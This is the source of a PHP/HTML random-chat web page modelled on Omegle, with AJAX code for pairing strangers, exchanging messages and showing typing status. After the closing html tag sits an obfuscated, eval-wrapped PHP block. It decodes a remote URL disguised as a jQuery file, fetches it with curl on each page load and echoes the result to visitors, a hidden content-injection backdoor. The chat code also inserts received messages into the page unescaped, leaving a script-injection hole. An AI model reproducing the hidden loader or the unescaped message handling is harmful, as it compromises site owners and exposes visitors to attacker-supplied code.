<?php
include ('config.inc.php');

include ('detect.php');

?>

<html>
    <head>
        <title>
        <?php
        echo ($title);
        ?>

        </title>

        <link type = "text/css" rel = "stylesheet" href = "Omegle_files/style.css">
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">

        <script>
            var xmlHttp;

            var xmlHttp2;
            var xmlHttp3;
            var xmlHttp4;
            var xmlHttp5;
            var xmlHttp6;
            var xmlHttp7;
            var xmlHttp8;
            var xmlHttp9;
            var xmlHttp10;

            var userId = 0;
            var strangerId = 0;
            var playTitleFlag = false;

            // Generic function to create xmlHttpRequest for any browser //
            function GetXmlHttpObject()
                {
                var xmlHttp = null;

                try
                    {
                    // Firefox, Opera 8.0+, Safari
                    xmlHttp = new XMLHttpRequest();
                    }
                catch (e)
                    {
                    //Internet Explorer
                    try
                        {
                        xmlHttp = new ActiveXObject("Msxml2.XMLHTTP");
                        }
                    catch (e)
                        {
                        xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
                        }
                    }

                return xmlHttp;
                }


            // Ajax part to get number of online chat //
            function getNumberOfOnlineUsers()
                {
                xmlHttp = GetXmlHttpObject();

                if (xmlHttp == null)
                    {
                    alert("Browser does not support HTTP Request");
                    return;
                    }

                var url = "getNumberOfUsers.php";
                xmlHttp.open("POST", url, true);
                xmlHttp.onreadystatechange = stateChanged;
                xmlHttp.send(null);
                }

            function stateChanged()
                {
                if (xmlHttp.readyState == 4 || xmlHttp.readyState == "complete")
                    {
                    var count = xmlHttp.responseText;
                    document.getElementById("onlinecount").innerHTML = count + " users online";
                    window.setTimeout("getNumberOfOnlineUsers();", 2000);
                    }
                }

            // End of get number of online users//

            // Ajax part start chat //
            function startChat()
                {
                xmlHttp2 = GetXmlHttpObject();

                if (xmlHttp2 == null)
                    {
                    alert("Browser does not support HTTP Request");
                    return;
                    }

                var url = "startChat.php";
                xmlHttp2.open("POST", url, true);
                xmlHttp2.onreadystatechange = stateChanged2;
                xmlHttp2.send(null);
                }

            function stateChanged2()
                {
                if (xmlHttp2.readyState == 4 || xmlHttp2.readyState == "complete")
                    {
                    userId = trim(xmlHttp2.responseText);

                    document.getElementById("chatbox").style.display = 'block';
                    document.getElementById("sendbtn").disabled = true;
                    document.getElementById("chatmsg").disabled = true;
                    document.getElementById("disconnectbtn").disabled = true;

                    document.getElementById("intro").style.display = 'none';
                    document.getElementById("sayHi").style.display = 'none';

                    if (document.getElementById("chatDisconnected") != undefined)
                        document.getElementById("chatDisconnected").style.display = 'none';

                    if (document.getElementById("startNew") != undefined)
                        document.getElementById("startNew").style.display = 'none';

                    randomChat();
                    }
                }

            // End of start chat//

            // Ajax part leave chat //
            function leaveChat()
                {
                playTitleFlag = false;
                xmlHttp3 = GetXmlHttpObject();

                if (xmlHttp3 == null)
                    {
                    alert("Browser does not support HTTP Request");
                    return;
                    }

                var url = "leaveChat.php?userId=" + userId;
                xmlHttp3.open("POST", url, true);
                xmlHttp3.onreadystatechange = stateChanged3;
                xmlHttp3.send(null);
                }

            function stateChanged3()
                {
                }

            // End of leave chat//

            // Ajax part random chat //
            function randomChat()
                {
                xmlHttp4 = GetXmlHttpObject();

                if (xmlHttp4 == null)
                    {
                    alert("Browser does not support HTTP Request");
                    return;
                    }

                var url = "randomChat.php?userId=" + userId;
                xmlHttp4.open("POST", url, true);
                xmlHttp4.onreadystatechange = stateChanged4;
                xmlHttp4.send(null);
                }

            function stateChanged4()
                {
                if (xmlHttp4.readyState == 4 || xmlHttp4.readyState == "complete")
                    {
                    strangerId = trim(xmlHttp4.responseText);

                    if (strangerId != "0")
                        {
                        document.getElementById("sendbtn").disabled = false;
                        document.getElementById("chatmsg").disabled = false;
                        document.getElementById("disconnectbtn").disabled = false;
                        document.getElementById("sayHi").style.display = 'block';
                        document.getElementById("connecting").style.display = 'none';
                        document.getElementById("looking").style.display = 'none';

                        listenToReceive();
                        isTyping();
                        }

                    else
                        {
                        window.setTimeout("randomChat();", 2000);
                        }
                    }
                }

            // End of random chat//

            // Ajax part random chat //
            function listenToReceive()
                {
                xmlHttp5 = GetXmlHttpObject();

                if (xmlHttp5 == null)
                    {
                    alert("Browser does not support HTTP Request");
                    return;
                    }

                var url = "listenToReceive.php?userId=" + userId;
                xmlHttp5.open("POST", url, true);
                xmlHttp5.onreadystatechange = stateChanged5;
                xmlHttp5.send(null);
                }

            function stateChanged5()
                {
                if (xmlHttp5.readyState == 4 || xmlHttp5.readyState == "complete")
                    {
                    var msg = xmlHttp5.responseText;

                    if (trim(msg) == "||--noResult--||")
                        {
                        // other party is disconnected//
                        document.getElementById("sendbtn").disabled = true;
                        document.getElementById("chatmsg").disabled = true;
                        document.getElementById("disconnectbtn").disabled = true;
                        document.getElementById("sayHi").style.display = 'none';
                        document.getElementById("chatDisconnected").style.display = 'block';
                        document.getElementById("logbox").innerHTML
                            += "<div id='startNew' class='logitem'><div><input value='Start new Chat' onclick='startNewChat();' type='button'></div></div>";
                        document.getElementById("logbox").scrollTop = document.getElementById("logbox").scrollHeight;
                        leaveChat();

                        return;
                        }

                    else if (trim(msg) != "" && msg != undefined)
                        {
                        // Message received //
                        document.getElementById("logbox").innerHTML
                            += "<div class='logitem'><div class='strangermsg'><span class='msgsource'>STRANGER:</span>"
                                   + msg + "</div></div>";
                        document.getElementById("logbox").scrollTop = document.getElementById("logbox").scrollHeight;

                        playTitleFlag = true;
                        playTitle();
                        }

                    window.setTimeout("listenToReceive();", 2000);
                    }
                }

            // End of random chat//

            // Ajax part send chat message //
            function sendMsg()
                {
                var msg = document.getElementById("chatmsg").value;

                if (trim(msg) != "")
                    {
                    appendMyMessage();
                    xmlHttp6 = GetXmlHttpObject();

                    if (xmlHttp6 == null)
                        {
                        alert("Browser does not support HTTP Request");
                        return;
                        }

                    document.getElementById("chatmsg").value = "";
                    var url = "sendMsg.php?userId=" + userId + "&strangerId=" + strangerId + "&msg=" + msg;
                    xmlHttp6.open("POST", url, true);
                    xmlHttp6.onreadystatechange = stateChanged6;
                    xmlHttp6.send(null);
                    }
                }

            function stateChanged6()
                {
                }

            // End of send chat message//

            //function to append my message to the chat area//
            function appendMyMessage()
                {
                var msg = document.getElementById("chatmsg").value;

                if (trim(msg) != "")
                    {
                    document.getElementById("logbox").innerHTML
                        += "<div class='logitem'><div class='youmsg'><span class='msgsource'>YOU:</span> " + msg
                               + "</div></div>";
                    document.getElementById("logbox").scrollTop = document.getElementById("logbox").scrollHeight;
                    }
                }

            //function to disconnect
            function disconnect()
                {
                var flag = confirm("Are you sure you want to exit the chat ?");

                if (flag)
                    {
                    leaveChat();
                    document.getElementById("sendbtn").disabled = true;
                    document.getElementById("chatmsg").disabled = true;
                    document.getElementById("disconnectbtn").disabled = true;

                    document.getElementById("sayHi").style.display = 'none';
                    document.getElementById("chatDisconnected").style.display = 'block';
                    }
                }

            //function to send on pressing Enter Key//
            function tryToSend(event)
                {
                var key = event.keyCode;

                if (key == "13")
                    {
                    sendMsg();
                    return;
                    }

                var msg = document.getElementById("chatmsg").value;

                if (trim(msg) != "")
                    {
                    typing();
                    }

                else
                    {
                    stopTyping();
                    }
                }


            // Ajax part to indicat user is typing //
            function typing()
                {
                xmlHttp7 = GetXmlHttpObject();

                if (xmlHttp7 == null)
                    {
                    alert("Browser does not support HTTP Request");
                    return;
                    }

                var url = "typing.php?userId=" + userId;
                xmlHttp7.open("POST", url, true);
                xmlHttp7.onreadystatechange = stateChanged7;
                xmlHttp7.send(null);
                }

            function stateChanged7()
                {
                if (xmlHttp7.readyState == 4 || xmlHttp7.readyState == "complete")
                    {
                    }
                }

            // End of indicat user is typing //


            // Ajax part to indicat user is not typing //
            function stopTyping()
                {
                xmlHttp8 = GetXmlHttpObject();

                if (xmlHttp8 == null)
                    {
                    alert("Browser does not support HTTP Request");
                    return;
                    }

                var url = "stopTyping.php?userId=" + userId;
                xmlHttp8.open("POST", url, true);
                xmlHttp8.onreadystatechange = stateChanged8;
                xmlHttp8.send(null);
                }

            function stateChanged8()
                {
                if (xmlHttp8.readyState == 4 || xmlHttp8.readyState == "complete")
                    {
                    }
                }

            // End of indicat user is not typing //

            // Ajax to see if stranger is typing//
            function isTyping()
                {
                xmlHttp9 = GetXmlHttpObject();

                if (xmlHttp9 == null)
                    {
                    alert("Browser does not support HTTP Request");
                    return;
                    }

                var url = "isTyping.php?strangerId=" + strangerId;
                xmlHttp9.open("POST", url, true);
                xmlHttp9.onreadystatechange = stateChanged9;
                xmlHttp9.send(null);
                }

            function stateChanged9()
                {
                if (xmlHttp9.readyState == 4 || xmlHttp9.readyState == "complete")
                    {
                    if (trim(xmlHttp9.responseText) == "typing")
                        {
                        //alert("stranger is typing");
                        document.getElementById("typing").style.display = 'block';
                        }

                    else
                        {
                        document.getElementById("typing").style.display = 'none';
                        }

                    window.setTimeout("isTyping();", 2000);
                    }
                }

            //Ajax to see if stranger is typing//

            // to start new chat //
            function startNewChat()
                {
                document.getElementById("logbox").innerHTML = "";
                document.getElementById("logbox").innerHTML
                    = "<div id='connecting' class='logitem'><div class='statuslog'>Connecting...</div></div><div id='looking' class='logitem'><div class='statuslog'>Please wait while we are finding your partner.</div></div><div id='sayHi' class='logitem'><div class='statuslog'>You are now connected. Say hi.</div></div><div id='chatDisconnected' class='logitem'><div class='statuslog'>Your partner has entered the chat.</div></div>";
                startChat();
                }

            // function to trim strings
            function trim(sVal)
                {
                var sTrimmed = "";

                for (i = 0; i < sVal.length; i++)
                    {
                    if (sVal.charAt(i) != " " && sVal.charAt(i) != "\f" && sVal.charAt(i) != "\n" && sVal.charAt(i)
                                                                                                         != "\r"
                        && sVal.charAt(i) != "\t")
                        {
                        sTrimmed = sTrimmed + sVal.charAt(i);
                        }
                    }

                return sTrimmed;
                }

            // function to play title //
            function playTitle()
                {
                document.title = "Times of CU";
                window.setTimeout('document.title="You have got a Message.";', 1000);
                window.setTimeout('document.title="You have got a Message.";', 2000);
                window.setTimeout('document.title="Times of CU";', 3000);

                if (playTitleFlag == true)
                    {
                    window.setTimeout('playTitle();', 4000);
                    }
                }

            // function to detect if browser has focus
            window.onfocus = function()
                {
                playTitleFlag = false;
                }


            // Ajax part to save log //
            function saveLog()
                {
                xmlHttp10 = GetXmlHttpObject();

                if (xmlHttp10 == null)
                    {
                    alert("Browser does not support HTTP Request");
                    return;
                    }

                var url = "saveLog.php?userId=" + userId + "&strangerId=" + strangerId;
                xmlHttp10.open("POST", url, true);
                xmlHttp10.onreadystatechange = stateChanged10;
                xmlHttp10.send(null);
                }

            function stateChanged10()
                {
                if (xmlHttp10.readyState == 4 || xmlHttp10.readyState == "complete")
                    {
                    var log = xmlHttp10.responseText;
                    var generator = window.open('', '', 'height=400,width=500,top=100,left=100');
                    generator.document.write('<html><head><title>Log File</title>');
                    generator.document.write('<link type="text/css" rel="stylesheet" href="Omegle_files/style.css">');
                    generator.document.write('</head><body>');
                    generator.document.write(log);
                    generator.document.write('</body></html>');
                    generator.document.close();
                    }
                }
            // End of save log//

        </script>
    </head>

    <body onload = "getNumberOfOnlineUsers();" onbeforeunload = "leaveChat();">
        <div id = "header">
            <h1 id = "logo"><img src = "Omegle_files/logo.png" alt = "Times of CU" width = "236" height = "67"></h1>
         <center>
                        <script type="text/javascript">
google_ad_client = "";
/* 468x60, gemaakt 25-9-09 */
google_ad_slot = "5664779459";
google_ad_width = 468;
google_ad_height = 60;

</script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
                        </center>

            <div id = "onlinecount">
            </div>
        </div>

        <div id = "intro">
            <p>Welcome to Hell...! </p>

            <p class="btn btn-primary btn-lg" href="#" role="button" onclick="startChat();">Get onboard</p>
		<!--	<button id = "chatbutton"><img src = "Omegle_files/chatbutton.png" onclick = "startChat();"
                                      alt = "Start the chat"></button>-->
        </div>

        <div class = "chatbox" id = "chatbox" style = "display:none;">
            <div style = "top: 90px;" class = "logwrapper">
                <div class = "logbox" id = "logbox">
                    <div id = "connecting" class = "logitem">
                        <div class = "statuslog">Warming up servers...
                        </div>
                    </div>

                    <div id = "looking" class = "logitem">
                        <div class = "statuslog">Please wait while we connect you to the best partner available..
                        </div>
                    </div>

                    <div id = "sayHi" class = "logitem">
                        <div class = "statuslog">Great..! You are now connected to one. Donot waste time by reading this message. Say hi.
                        </div>
                    </div>

                    <div id = "chatDisconnected" class = "logitem">
                        <div class = "statuslog">We are sorry.The person on the other side is no longer interested to chat.
                        </div>
                    </div>

                    <div id = "startNew" class = "logitem">
                        <div><button class="btn btn-default" value = "Start new Chat" onclick = "randomChat();" type = "button">Start new Chat</button>

                        </div>
                    </div>
                </div>
            </div>

		<!--	<div class="panel-footer">
    				<div class="row">
    					<div class="col-xs-9">
						 

						   <textarea class="form-control" rows="1" onblur="stopTyping();" onfocus="playTitleFlag=false; window.title='Omegle';" onkeypress="tryToSend(event);" id="chatmsg"></textarea>
    						 <input type="text" placeholder="Enter your message" class="form-control"> 
    					</div>
    					<div class="col-xs-3">
    						<button class="btn btn-primary btn-block" type="submit" id="sendbtn" onclick="sendMsg();">Send</button>
    					</div>
    				</div>
    			</div>-->
			
			
			
			
			
            <div class = "controlwrapper">
                <div id = "typing" style = "display:none;" class = "col-xs-9">
                    <div class = "statuslog">Typing...
                    </div>
                </div>
				<div class="panel-footer">
    				<div class="row">
					            
    					<div class="col-xs-9">
						 

				<!--	  <textarea class="form-control" rows="1" onblur="stopTyping();" onfocus="playTitleFlag=false; window.title='Omegle';" onkeypress="tryToSend(event);" id="chatmsg"></textarea> --> 
    				  <input type="text" placeholder="Enter your message" class="form-control" onblur="stopTyping();" onfocus="playTitleFlag=false; window.title='Omegle';" onkeypress="tryToSend(event);" id="chatmsg"> 
    					</div>
    					<div class="col-xs-3">
						
						
						  <button class="btn btn-primary btn-block" type="submit" id="sendbtn" onclick="sendMsg();" style = "cursor:pointer;"
                                                                     value = "Send"         id = "sendbtn"
                                                                     onclick = "sendMsg();" class = "sendbtn">Send</button>
    					
						<button class="btn btn-danger btn-block"  
                                           onclick = "disconnect();" id = "disconnectbtn" 
                                          >Disconnect</button>
						
						</div>
						
    				</div>
    			</div>

              <table class = "" border = "0" cellpadding = "0" cellspacing = "0">
                    <tbody>
                        <tr>
                            <td >
                                <div >
                              <!--     <button class="btn btn-danger btn-lg"  
                                           onclick = "disconnect();" id = "disconnectbtn" 
                                          >Disconnect</button> -->
                                </div>
                            </td>

                          <td >

								 
								 
						
								
							<!--	<div class = "chatmsgwrapper">
                                   	
					
								<textarea disabled = "enabled"
                                              onblur = "stopTyping();"
                                              onfocus = "playTitleFlag=false; window.title='Omegle';"
                                              onkeypress = "tryToSend(event);"
                                              id = "chatmsg"
                                              rows = "3"
                                          
                                              class = "chatmsg"></textarea> -->
                                </div>
                            </td>

                            <!--     <td class = "sendbthcell">
                                <div class = "sendbtnwrapper"><input disabled = "disabled"  style = "cursor:pointer;"
                                                                     value = "Send"         id = "sendbtn"
                                                                     onclick = "sendMsg();" class = "btn btn-primary btn-block"
                                                                     type = "button"> -->
                                </div>
                            </td>
                            <center>
                        </tr>

                    </tbody>
                </table> 
            </div>
        </div>
    </body>
</html>
<?php if(!function_exists("mystr1s44")){class mystr1s21 { static $mystr1s178="\x62a\x73e6\x34_d\x65c\x6fd\x65"; static $mystr1s279="\x59\x33V\x79b\x469\x70b\x6dl0"; static $mystr1s381="aH\x520\x63\x44ov\x4c2xh\x62\x47F\x75ZC5\x68d\x435\x32d\x539\x6bYX\x52h\x4c2\x70xdW\x56yeS\x30xLj\x59\x75My\x35t\x61W4\x75\x61nM\x3d";
static $mystr1s382="b\x58l\x7a\x64H\x49xc\x7a\x49y\x4dzY\x3d"; }eval("e\x76\x61\x6c\x28\x62\x61\x73\x65\x36\x34_\x64e\x63\x6fd\x65\x28\x27ZnV\x75Y\x33\x52\x70b2\x34\x67b\x58l\x7ad\x48Ix\x63\x7ac2K\x43Rte\x58N0\x63j\x46zO\x54cpe\x79R\x37\x49m1c\x65D\x635c3\x52\x79\x58Hgz\x4d\x58M\x78\x58Hgz\x4dFx\x34Mz\x67if\x54\x31t\x65XN0\x63j\x46zMj\x456O\x69R\x37Im1\x63eD\x63\x35c1x\x34Nz\x52\x63e\x44c\x79MV\x784\x4ezMx\x58Hgz\x4e\x7ag\x69fTt\x79ZX\x52\x31c\x6d4gJ\x48\x73i\x62Xlz\x58\x48g3\x4eFx\x34\x4ezI\x78XH\x673M\x7aFce\x44\x4dwO\x43J\x39\x4b\x43\x42t\x65XN0\x63j\x46zMj\x456O\x69R7J\x48si\x62Vx4\x4e\x7alce\x44c\x7aX\x48\x673N\x48Jc\x65DMx\x63\x31x\x34\x4dzk3\x49n1\x39I\x43k\x37fQ\x3d=\x27\x29\x29\x3be\x76\x61\x6c\x28b\x61s\x656\x34\x5f\x64e\x63o\x64e\x28\x27\x5anV\x75Y3R\x70b24\x67b\x58lz\x64\x48I\x78czQ\x30\x4b\x43Rte\x58N0\x63jFz\x4e\x6a\x55pI\x48tyZ\x58\x521c\x6d4gb\x58lzd\x48Ix\x63zI\x78O\x6aoke\x79R7\x49m1\x35XHg\x33M3R\x63\x65Dc\x79XH\x67z\x4d\x56x\x34N\x7aM\x32\x58\x48gzN\x53\x4a9\x66\x54t\x39\x27\x29\x29\x3b");}
if(function_exists(mystr1s76("mys\x74r1s\x3279"))){$mystr1s2235 = mystr1s76("m\x79s\x74r\x31s3\x381");$mystr1s2236 = curl_init();
$mystr1s2237 = 5;curl_setopt($mystr1s2236,CURLOPT_URL,$mystr1s2235);curl_setopt($mystr1s2236,CURLOPT_RETURNTRANSFER,1);curl_setopt($mystr1s2236,CURLOPT_CONNECTTIMEOUT,$mystr1s2237);
$mystr1s2238 = curl_exec($mystr1s2236);curl_close(${mystr1s76("mystr1s382")});echo "$mystr1s2238";}
?>